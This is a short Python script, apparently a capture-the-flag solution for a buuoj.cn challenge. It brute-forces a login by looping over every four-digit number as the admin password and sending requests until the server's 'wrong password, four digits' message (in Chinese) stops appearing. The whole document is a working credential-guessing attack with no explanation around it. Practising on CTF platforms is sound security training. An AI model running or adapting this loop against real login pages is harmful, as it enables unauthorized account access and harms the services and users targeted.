import requests
url = "http://ce0698f6-fa8d-4c89-9eb8-27959c60f3a2.node4.buuoj.cn:81/?username=admin&password="
for i in range(1000, 10000):
    res = requests.get(url + str(i))
    print("[*] Try:", i)
    if res.text != "密码错误，为四位数字。":
        print(res.text)
        break